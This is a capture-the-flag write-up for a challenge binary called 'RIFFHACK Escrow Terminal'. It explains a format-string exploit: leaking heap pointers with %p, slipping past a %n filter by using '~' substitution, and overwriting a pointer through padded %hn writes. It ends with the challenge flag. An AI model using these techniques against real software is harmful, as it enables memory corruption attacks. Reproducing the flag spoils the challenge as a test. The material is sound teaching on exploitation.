# RIFFHACK Escrow Terminal

## Description

A marketplace vendor is testing a native escrow-release utility for trusted deals. Review the downloadable terminal, find the unsafe note renderer, and release the payout on the remote service.

## Solution Walkthrough

### Step 1: Analyze features and vulnerabilities

After connecting to the server, you will see the following menu:

```text
1) view pending deal
2) update buyer note
3) review buyer note
4) sync dispute cache
5) finalize escrow
6) exit
```

After briefly looking over the features, you can start analyzing the binary.

The most important parts are Option 2, Option 3, Option 4, Option 5, and the `vault` data structure.

---

#### Option 2: note filter

Option 2 has a note filter that blocks `%n` writes in format strings.

Reconstructed in C, it looks roughly like this:

```c
int validate_note(char *note) {
    for (int i = 0; note[i] != '\0'; i++) {
        if (note[i] == '%') {
            for (int j = i + 1; note[j] != '\0' && j < i + 0x12; j++) {
                if (note[j] == 'n') {
                    return 0;
                }
            }
        }
    }

    return strlen(note) < 0x60;
}
```

---

#### Option 3: unsafe note renderer

The review function in Option 3 executes the following at the end:

```c
printf(note, width, 0x52,
    &active_vault,
    (char *)&active_vault + 2,
    (char *)&active_vault + 4,
    ...pointers);
```

Therefore, you can use a format string to leak the heap pointer.

---

#### Option 4: sync dispute cache

Option 4, `sync dispute cache`, does two things to the second `vault`:

```asm
strh    w9, [x10, #0x28]    ; vaults[1].approval_latch = 0x51ff
...
add     x0, x8, #0x28       ; checksum(&vaults[1])
bl      checksum
...
strh    w0, [x8, #0x2a]     ; vaults[1].mirror_latch = checksum
```

Conceptually, this is equivalent to:

```c
vaults[1].approval_latch = 0x51ff;
vaults[1].mirror_latch = checksum(&vaults[1]);
```

In other words, after Option 4 executes, `vaults[1]` becomes a trusted vault that can pass the `finalize escrow` check.

So the goal is to point `active_vault` to `vaults[1]`.

Option 4 has a second key point: it replaces `~` with `n`.

```asm
subs    w8, w8, #0x7e      ; '~'
b.ne    ...
mov     w8, #0x6e          ; 'n'
strb    w8, [x9]
```

Written in C, it looks roughly like this:

```c
for (...) {
    if (note[i] == '~') {
        note[i] = 'n';
    }
}
```

This can be combined with the previously mentioned Option 2 for exploitation.

Option 2 blocks `%n`, but Option 4 changes `%~` back to `%n`, which allows bypassing the `%n` restriction.

---

#### Option 5: finalize escrow

The check conditions for Option 5 `finalize escrow` can be reconstructed as:

```c
if (active_vault->approval_latch == 0x51ff &&
    active_vault->mirror_latch == checksum(active_vault)) {
    release_flag();
} else {
    puts("escrow held. active vault is not trusted.");
}
```

The `checksum` function is as follows:

```asm
ldrh    w8, [x0]
ldrh    w9, [x0, #0x4]
eor     w8, w8, w9
mov     w9, #0x2a5a
eor     w8, w8, w9
```

Written in C, it looks roughly like this:

```c
uint16_t checksum(vault_t *v) {
    return v->approval_latch ^ *(uint16_t *)((char *)v + 4) ^ 0x2a5a;
}
```

---

#### vault structure

In the initialization function, you can see:

```asm
mov     x0, #0x2
mov     x1, #0x28
bl      _calloc
```

In other words, the program allocates two `vault` objects of size `0x28`:

```c
typedef struct {
    uint16_t approval_latch;    // +0x00
    uint16_t mirror_latch;      // +0x02
    uint32_t deal_id;           // +0x04
    char label[0x20];           // +0x08
} vault_t;                      // total: 0x28 bytes

vault_t *vaults = calloc(2, 0x28);
vault_t *active_vault = &vaults[0];
```

The heap layout is as follows:

```text
vault_base
├── vaults[0] / primary escrow vault
└── vaults[1] / dispute escrow snapshot = vault_base + 0x28
```

---

#### active_vault

`active_vault` is an 8-byte pointer stored in the global area. At the beginning of the program, it points to the first `vault`:

```c
vault_t *active_vault = &vaults[0];
```

Option 5 does not always check `vaults[0]`, but rather checks:

```c
active_vault->approval_latch
active_vault->mirror_latch
```

Therefore, our goal is not to directly modify the fields of `vaults[0]`, but to change `active_vault` from pointing to `vaults[0]` to pointing to `vaults[1]`.

Option 4 already sets `vaults[1]` to a trusted state:

```c
vaults[1].approval_latch = 0x51ff;
vaults[1].mirror_latch = checksum(&vaults[1]);
```

So, in the end, we just need to achieve:

```c
active_vault = &vaults[1];
```

Option 5 will then treat `vaults[1]` as the current escrow vault and pass the check.

---

### Step 2: Leak heap pointer

The goal of this step is to leak the heap pointer using Option 2 and Option 3 via a format string.

The heap address is affected by ASLR, so you cannot hardcode the address of `vaults[1]`.

Some pointers passed into the review function fall into the following positions:

```text
vault_base + 0x07
vault_base + 0x13
vault_base + 0x21
vault_base + 0x2d
```

Therefore, you can inject a format string into Option 2 to leak the arguments:

```text
%1$p|%2$p|%3$p|...|%8$p
```

Since the note length must be less than `0x60`, the script leaks 8 slots at a time and scans up to `%32$p`.

Then, subtract the known offset from each leak:

```python
VAULT_LEAK_OFFSETS = (0x7, 0x13, 0x21, 0x2d)

base = leaked_ptr - offset
```

If multiple leaks derive the same base address (aligned to `0x10`), then that address is confirmed to be the `vault_base`:

```python
vault_base = recovered_base
second_vault = vault_base + 0x28
```

---

### Step 3: Rewrite active_vault using `%hn`

The goal of this step is to use `%hn` to rewrite `active_vault`.

In Option 3, the 3rd, 4th, and 5th positional arguments of `printf()` are fixed:

```c
printf(note,
    width,
    0x52,
    &active_vault,                 // %3$
    (char *)&active_vault + 2,     // %4$
    (char *)&active_vault + 4,     // %5$
    ...);
```

These three arguments point to different parts of `active_vault`:

```text
%3$ -> active_vault 的 bytes 0~1
%4$ -> active_vault 的 bytes 2~3
%5$ -> active_vault 的 bytes 4~5
```

`%hn` writes the number of characters printed by `printf()` so far as a 2-byte unsigned short into the specified address.

First, split the address of `second_vault` into three 16-bit halfwords:

```python
h0 = second_vault & 0xffff
h1 = (second_vault >> 16) & 0xffff
h2 = (second_vault >> 32) & 0xffff
```

Then perform the writes using three `%hn` operations:

```text
%3$hn -> 寫入 h0，覆蓋 active_vault bytes 0~1
%4$hn -> 寫入 h1，覆蓋 active_vault bytes 2~3
%5$hn -> 寫入 h2，覆蓋 active_vault bytes 4~5
```

However, since `n` is blocked, you must actually write it as:

```text
%3$h~
%4$h~
%5$h~
```

This way it will not be intercepted when passing through Option 2 and will be changed back in Option 4:

```text
%3$hn
%4$hn
%5$hn
```

At the same time, Option 4 will also set `vaults[1]` as a trusted vault.

Finally, when Option 3 executes `printf(note, ...)`, it will trigger the `%hn` write.

In the heap pointer for this problem, the highest 16 bits are already `0x0000`, so by overwriting the lower 48 bits, you can ensure:

```c
active_vault = second_vault;
```

Since `%hn` writes the current output count, the payload must use `%c` to fill the output count. For example:

```text
%1$123c%3$hn
```

This means outputting 123 characters first, then writing `0x007b` to the address pointed to by the third argument.

The script sorts the three halfwords from smallest to largest and adds padding based on the differences to avoid unnecessary large outputs or 16-bit wraparound.

The final flow is as follows:

1. Option 4 first changes `vaults[1]` into a trusted vault.
2. The format string vulnerability in Option 3 changes the `active_vault` pointer to `vaults[1]`.
3. The target checked by Option 5 becomes the now-legal `vaults[1]`.
4. Successfully obtain the flag.

## 流程圖

```text
Option 2：寫入 %1$p 到 %32$p 的 leak payload
        ↓
Option 3：printf(note, ...) 印出多個 pointer
        ↓
利用 vault_base + 0x7 / 0x13 / 0x21 / 0x2d
回推出 vault_base
        ↓
計算 second_vault = vault_base + 0x28
        ↓
把 second_vault 拆成三個 16-bit halfword
        ↓
Option 2：寫入 %3$h~、%4$h~、%5$h~
並用 %c 控制各次 %hn 的寫入值
        ↓
Option 4：sync dispute cache
        ↓
vaults[1] 被設為 trusted vault
並且 ~ 被替換成 n
        ↓
payload 變成 %3$hn、%4$hn、%5$hn
        ↓
Option 3：再次觸發 printf(note, ...)
        ↓
三個 %hn 分別覆蓋 active_vault 的低 48 bits
        ↓
active_vault = second_vault
        ↓
Option 5：finalize escrow
        ↓
檢查的是已經 trusted 的 vaults[1]
        ↓
取得 flag
```

## Flag

```text
bitctf{{35cr0w_n0735_wr173_th3_ch3ck}}
```
